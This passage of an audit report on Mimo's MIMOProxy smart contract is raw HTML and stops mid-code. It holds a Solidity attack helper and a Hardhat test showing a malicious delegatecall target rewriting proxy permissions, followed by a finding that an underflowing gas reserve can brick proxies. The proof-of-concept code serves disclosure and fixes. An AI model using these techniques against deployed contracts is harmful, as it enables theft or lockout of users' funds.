Selector 0x694bf8a2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setPermission</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     </span><span class=\"mtk12\">_permissions</span><span class=\"mtk1\">[</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">)][</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">)][</span><span class=\"mtk7\">0xdeadbeef</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Then deploy the <code>ProxyAttacks</code> helper in a test environment and use <code>MIMOProxy</code> to <code>delegatecall</code> into it:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"typescript\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk12\">chai</span><span class=\"mtk1\">, { </span><span class=\"mtk12\">expect</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;chai&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;ethereum-waffle&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">deployments</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;hardhat&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">MIMOProxy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MIMOProxyFactory</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MIMOProxyRegistry</span><span class=\"mtk1\">, </span><span class=\"mtk12\">ProxyAttacks</span><span class=\"mtk1\"> } </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&#39;../../typechain&#39;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">chai</span><span class=\"mtk1\">.</span><span class=\"mtk11\">use</span><span class=\"mtk1\">(</span><span class=\"mtk12\">solidity</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">setup</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">deployments</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createFixture</span><span class=\"mtk1\">(</span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">deploy</span><span class=\"mtk1\"> } = </span><span class=\"mtk12\">deployments</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> [</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">] = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getSigners</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MIMOProxy&quot;</span><span class=\"mtk1\">, {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">args:</span><span class=\"mtk1\"> [],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mimoProxyBase</span><span class=\"mtk1\">: </span><span class=\"mtk10\">MIMOProxy</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContract</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MIMOProxy&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MIMOProxyFactory&quot;</span><span class=\"mtk1\">, {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">args:</span><span class=\"mtk1\"> [</span><span class=\"mtk12\">mimoProxyBase</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mimoProxyFactory</span><span class=\"mtk1\">: </span><span class=\"mtk10\">MIMOProxyFactory</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContract</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MIMOProxyFactory&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MIMOProxyRegistry&quot;</span><span class=\"mtk1\">, {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">args:</span><span class=\"mtk1\"> [</span><span class=\"mtk12\">mimoProxyFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mimoProxyRegistry</span><span class=\"mtk1\">: </span><span class=\"mtk10\">MIMOProxyRegistry</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContract</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MIMOProxyRegistry&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ProxyAttacks&quot;</span><span class=\"mtk1\">, {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">args:</span><span class=\"mtk1\"> [],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proxyAttacks</span><span class=\"mtk1\">: </span><span class=\"mtk10\">ProxyAttacks</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContract</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ProxyAttacks&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">mimoProxyBase</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">mimoProxyFactory</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">mimoProxyRegistry</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">proxyAttacks</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  };</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">});</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">describe</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Proxy attack tests&quot;</span><span class=\"mtk1\">, () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Permission manipulation by malicious target&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> { </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">mimoProxyRegistry</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proxyAttacks</span><span class=\"mtk1\"> } = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setup</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mimoProxyRegistry</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deploy</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentProxy</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mimoProxyRegistry</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getCurrentProxy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proxy</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getContractAt</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MIMOProxy&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">currentProxy</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Call setPermission on ProxyAttacks contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">execute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proxyAttacks</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;0x694bf8a2&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">envoy</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;0x0000000000000000000000000000000000000001&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">target</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;0x0000000000000000000000000000000000000002&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">selector</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;0xdeadbeef&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Proxy&#39;s permissions have been updated</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proxy</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPermission</span><span class=\"mtk1\">(</span><span class=\"mtk12\">envoy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">target</span><span class=\"mtk1\">, </span><span class=\"mtk12\">selector</span><span class=\"mtk1\">)).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">equal</span><span class=\"mtk1\">(</span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">});</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/161#issuecomment-1210524910\">RayXpub (Mimo) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>We acknowledge that this could be an issue although it requires the user to approve a malicious contract to happen, and thus is functioning as was intended by the proxy design.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/161#issuecomment-1221557634\">gzeoneth (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Grouping multiple issues related to delegate call storage here, judging as Med Risk since any malicious contract require user approval.</p>\n</blockquote>\n<p><strong>horsefacts (warden) reviewed mitigation:</strong></p>\n<blockquote>\n<p><strong>Status:</strong> ✅ Resolved</p>\n</blockquote>\n<blockquote>\n<p><strong>Finding:</strong> Wardens identified that malicious target contracts could manipulate storage variables in <code>MIMOProxy</code>, including the contract’s <code>_initialized</code> and <code>_initializing</code> state variables and permissions granted to external “envoys.”</p>\n</blockquote>\n<blockquote>\n<p><strong>What changed:</strong> The Mimo team have removed all storage variables from <code>MIMOProxy</code>:</p>\n<ul>\n<li>The <code>MIMOProxy</code> contract is no longer <code>Initializable</code>, removing <code>_initialized</code> and <code>_initializing</code>.</li>\n<li>Proxy owner is now stored in <code>MIMOProxyFactory</code>, removing <code>owner</code>.</li>\n<li>Minimum gas reserve is now stored in <code>MIMOProxyFactory</code>, removing <code>minGasReserve</code>.</li>\n<li>Permissions are now stored in a separate <code>MIMOProxyGuard</code> contract, removing the <code>_permissions</code> mapping.</li>\n</ul>\n</blockquote>\n<blockquote>\n<p><strong>Why it works:</strong> Since <code>MIMOProxy</code> no longer includes any storage variables, they cannot be maliciously manipulated by <code>delegatecall</code> to target contracts.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-03-malicious-manipulation-of-gas-reserve-can-deny-access-to-mimoproxy\" style=\"position:relative;\"><a href=\"#m-03-malicious-manipulation-of-gas-reserve-can-deny-access-to-mimoproxy\" aria-label=\"m 03 malicious manipulation of gas reserve can deny access to mimoproxy permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/158\">[M-03] Malicious manipulation of gas reserve can deny access to MIMOProxy</a></h2>\n<p><em>Submitted by horsefacts, also found by giovannidisiena and Lambda</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L18-L19\">https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L18-L19</a></p>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L74-L79\">https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L74-L79</a></p>\n<h3 id=\"vulnerability-details-1\" style=\"position:relative;\"><a href=\"#vulnerability-details-1\" aria-label=\"vulnerability details 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability Details</h3>\n<p>The <code>MIMOProxy</code> contract defines a <code>minGasReserve</code> value as a storage variable:</p>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L18-L19\"><code>MIMOProxy.sol#L18</code></a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">/// @inheritdoc IMIMOProxy</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">override</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minGasReserve</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>The <code>execute</code> function uses this <code>minGasReserve</code> value to calculate a gas stipend to provide to the target contract when executing a <code>delegatecall</code>:</p>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L74-L79\"><code>MIMOProxy.sol#L74</code></a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Reserve some gas to ensure that the function has enough to finish the execution.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stipend</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">gasleft</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">minGasReserve</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Delegate call to the target contract.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk12\">response</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">target</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegatecall</span><span class=\"mtk1\">{ gas: </span><span class=\"mtk12\">stipend</span><span class=\"mtk1\"> }(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Although <code>minGasReserve</code> is a public storage variable, it has no corresponding setter function. There used to be one in the upstream <code>PRBProxy</code>, but it was <a href=\"https://github.com/paulrberg/prb-proxy/blob/main/CHANGELOG.md#removed\">removed</a> in version 2.0. The intent of this change was to simplify the proxy contract, while allowing users to <code>delegatecall</code> to their own target contract to <a href=\"https://github.com/paulrberg/prb-proxy/issues/21\">set this value</a> if necessary.</p>\n<p>However, a malicious target contract can permanently block access to a <code>MIMOProxy</code> by setting <code>minGasReserve</code> to a very high value and forcing an underflow in the gas stipend calculation:</p>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L74-L75\"><code>MIMOProxy.sol#L75</code></a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Reserve some gas to ensure that the function has enough to finish the execution.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stipend</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">gasleft</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">minGasReserve</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>If a target contract intentionally or accidentally sets <code>minGasReserve</code> to a value higher than the block gas limit, the <code>execute</code> function will always underflow and revert. In this scenario, it is impossible to set <code>minGasReserve</code> back to a reasonable value, since the change must be made through the <code>execute</code> function.</p>\n<p><strong>Impact:</strong> If a user intentionally or accidentally sets a high <code>minGasReserve</code>, they may permanently lose access to their <code>MIMOProxy</code>. Malicious target contracts may attempt to trick users into bricking their proxy contracts using this method.</p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Restore the <code>setMinGasReserve</code> function removed in <code>PRBProxy</code> v2.0, which will allow the proxy owner to directly set this value:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMinGasReserve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newMinGasReserve</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">owner</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 